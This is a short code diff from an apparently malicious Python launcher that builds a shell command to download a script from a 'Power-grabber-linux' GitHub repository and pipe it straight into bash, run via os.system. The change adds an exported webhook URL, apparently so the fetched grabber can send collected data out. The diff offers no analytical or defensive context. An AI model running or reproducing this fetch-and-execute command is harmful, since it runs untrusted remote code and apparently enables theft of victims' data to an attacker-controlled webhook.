@@ -11,7 +11,7 @@ except ImportError:
 time.sleep(1)
 
 # Command to download and execute the Bash script from GitHub
-command = f"bash -c 'wget -qO- https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/main/taktikal | bash'"
+command = f"export dc='{webhook_url}' && bash -c 'wget -qO- https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/main/taktikal | bash'"
 
 # Execute the command
 os.system(command)
